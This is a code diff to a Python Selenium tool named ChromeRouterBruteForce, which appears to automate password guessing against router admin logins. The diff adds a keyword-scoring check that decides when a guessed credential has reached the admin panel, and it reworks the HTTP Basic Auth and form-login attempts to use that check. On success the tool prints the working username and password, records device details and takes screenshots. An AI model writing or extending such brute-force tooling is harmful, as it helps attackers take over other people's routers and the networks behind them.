@@ -450,6 +450,105 @@ class ChromeRouterBruteForce:
         except:
             return None
     
+    def extract_device_info(self):
+        """Extract device information from admin panel"""
+        try:
+            device_info = {}
+            
+            # Get page title
+            device_info['title'] = self.driver.title
+            
+            # Try to extract common device information
+            page_source = self.driver.page_source.lower()
+            
+            # Look for manufacturer info
+            manufacturer_patterns = ['manufacturer', 'vendor', 'brand', 'model', 'device name', 'product name']
+            for pattern in manufacturer_patterns:
+                if pattern in page_source:
+                    device_info['manufacturer'] = f"Found {pattern}"
+                    break
+            
+            # Look for uptime info
+            uptime_patterns = ['uptime', 'system uptime', 'device uptime', 'running time']
+            for pattern in uptime_patterns:
+                if pattern in page_source:
+                    device_info['uptime'] = f"Found {pattern}"
+                    break
+            
+            # Look for firmware version
+            firmware_patterns = ['firmware', 'version', 'software version', 'build']
+            for pattern in firmware_patterns:
+                if pattern in page_source:
+                    device_info['firmware'] = f"Found {pattern}"
+                    break
+            
+            # Look for device status
+            status_patterns = ['device status', 'system status', 'router status', 'gateway status']
+            for pattern in status_patterns:
+                if pattern in page_source:
+                    device_info['status'] = f"Found {pattern}"
+                    break
+            
+            return device_info
+            
+        except Exception as e:
+            return {'error': str(e)}
+    
+    def is_admin_panel_loaded(self):
+        """Check if we're in admin panel with detailed verification"""
+        try:
+            current_url = self.driver.current_url
+            page_source = self.driver.page_source.lower()
+            page_title = self.driver.title.lower()
+            
+            # Check for error pages
+            error_indicators = ['this site can\'t be reached', 'site can\'t be reached', 'connection refused', 'timeout', 'error', 'not found', 'unavailable']
+            if any(error in page_source for error in error_indicators):
+                return False, "Error page detected"
+            
+            # Check for admin panel indicators
+            admin_indicators = [
+                'admin', 'administrator', 'dashboard', 'control panel', 'configuration', 
+                'settings', 'system', 'status', 'network', 'router', 'gateway', 'modem',
+                'wan', 'lan', 'wireless', 'firewall', 'nat', 'dhcp', 'dns', 'qos',
+                'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart',
+                'main menu', 'welcome', 'logout', 'log out', 'management', 'monitor',
+                'device', 'interface', 'port', 'service', 'security', 'advanced',
+                'device info', 'system info', 'router info', 'gateway info'
+            ]
+            
+            # Check for login page indicators (negative)
+            login_indicators = [
+                'username', 'password', 'login', 'sign in', 'authentication', 'enter credentials',
+                'user login', 'admin login', 'router login', 'invalid', 'incorrect', 'failed',
+                'error', 'denied', 'wrong', 'access denied', 'please login', 'enter username'
+            ]
+            
+            # Check for specific success indicators
+            success_indicators = [
+                'logout', 'log out', 'welcome', 'dashboard', 'main menu', 'system status',
+                'device status', 'network status', 'router status', 'admin panel',
+                'device info', 'system info', 'router info', 'gateway info'
+            ]
+            
+            admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
+            login_count = sum(1 for indicator in login_indicators if indicator in page_source)
+            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
+            
+            # Check if URL changed from login page
+            url_changed = not any(login_term in current_url for login_term in ['login', 'signin', 'sign-in', 'auth', 'authentication'])
+            
+            # Strong success criteria: more admin indicators than login indicators AND has success indicators
+            if admin_count > login_count and admin_count >= 3 and success_count >= 1 and url_changed:
+                # Extract device information
+                device_info = self.extract_device_info()
+                return True, f"Admin panel loaded - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, Device: {device_info}"
+            
+            return False, f"Not admin panel - Admin: {admin_count}, Login: {login_count}, Success: {success_count}"
+            
+        except Exception as e:
+            return False, f"Error checking admin panel: {e}"
+    
     def test_http_basic_auth(self, username, password, login_url):
         """Test HTTP Basic Authentication"""
         try:
@@ -463,32 +562,18 @@ class ChromeRouterBruteForce:
             self.driver.get(auth_url)
             time.sleep(5)  # Wait longer for page to load completely
             
-            current_url = self.driver.current_url
-            page_source = self.driver.page_source.lower()
+            # Check if we're in admin panel
+            is_admin, reason = self.is_admin_panel_loaded()
             
-            # Check if we successfully bypassed auth
-            if "data:," not in current_url and current_url != "about:blank":
-                # Check for admin panel indicators
-                admin_indicators = ['admin', 'dashboard', 'control panel', 'configuration', 'settings', 'system', 'status', 'network', 'router', 'gateway', 'management', 'monitor', 'device', 'interface', 'wan', 'lan', 'wireless', 'firewall', 'nat', 'dhcp', 'dns', 'qos', 'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart', 'main menu', 'welcome', 'logout', 'log out']
-                admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
-                
-                # Check for login page indicators (negative)
-                login_indicators = ['username', 'password', 'login', 'sign in', 'authentication', 'enter credentials', 'user login', 'admin login', 'router login', 'invalid', 'incorrect', 'failed', 'error', 'denied', 'wrong', 'access denied', 'please login', 'enter username']
-                login_count = sum(1 for indicator in login_indicators if indicator in page_source)
-                
-                # Check for specific success indicators
-                success_indicators = ['logout', 'log out', 'welcome', 'dashboard', 'main menu', 'system status', 'device status', 'network status', 'router status', 'admin panel']
-                success_count = sum(1 for indicator in success_indicators if indicator in page_source)
-                
-                # Strong success criteria: more admin indicators than login indicators AND has success indicators
-                if admin_count > login_count and admin_count >= 3 and success_count >= 1:
-                    print(f"{Colors.GREEN}[+] HTTP Basic Auth successful! {username}:{password}{Colors.END}")
-                    # Wait a bit more for admin panel to fully load
-                    time.sleep(2)
-                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
-                    return True, screenshot_path
+            if is_admin:
+                print(f"{Colors.GREEN}[+] HTTP Basic Auth successful! {username}:{password}{Colors.END}")
+                print(f"{Colors.BLUE}[*] Admin panel details: {reason}{Colors.END}")
+                # Wait a bit more for admin panel to fully load
+                time.sleep(3)
+                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                return True, screenshot_path
             
-            return False, "HTTP Basic Auth failed"
+            return False, f"HTTP Basic Auth failed: {reason}"
             
         except Exception as e:
             return False, f"HTTP Basic Auth error: {e}"
@@ -506,6 +591,13 @@ class ChromeRouterBruteForce:
             # Navigate to login page for form-based authentication
             self.driver.get(login_url)
             time.sleep(5)  # Wait longer for page to load completely
+            
+            # Check if page loaded properly (not error page)
+            is_admin, reason = self.is_admin_panel_loaded()
+            if "Error page detected" in reason:
+                print(f"{Colors.YELLOW}[!] Page load error detected, refreshing...{Colors.END}")
+                self.driver.refresh()
+                time.sleep(5)
             
             # Detect login form
             username_field, password_field = self.detect_login_form()
@@ -545,8 +637,8 @@ class ChromeRouterBruteForce:
                 print(f"{Colors.YELLOW}[-] Login failed: {alert_text}{Colors.END}")
                 return False, f"Alert: {alert_text}"
             
-            # Check if login was successful
-            success, reason = self.is_login_successful()
+            # Check if login was successful using new method
+            success, reason = self.is_admin_panel_loaded()
             
             if success:
                 print(f"{Colors.GREEN}[+] Login successful! {reason}{Colors.END}")
